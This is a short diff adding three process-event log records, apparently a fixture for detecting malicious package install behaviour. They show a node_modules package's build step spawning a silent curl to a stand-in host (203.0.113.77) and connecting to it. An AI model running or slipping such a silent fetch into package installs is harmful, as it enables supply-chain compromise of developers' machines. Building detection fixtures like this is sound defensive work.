@@ -1,0 +1,3 @@
+{"kind":"exec","ts":8100000000,"pid":910,"ppid":1,"comm":"sh","cwd":"/repo/node_modules/quiet-beacon","cmdline":"sh -c node-gyp rebuild"}
+{"kind":"exec","ts":8101000000,"pid":911,"ppid":910,"comm":"curl","cwd":"/repo/node_modules/quiet-beacon","cmdline":"curl -s http://203.0.113.77/b"}
+{"kind":"connect","ts":8102000000,"pid":911,"ppid":910,"comm":"curl","dest":"203.0.113.77:80"}
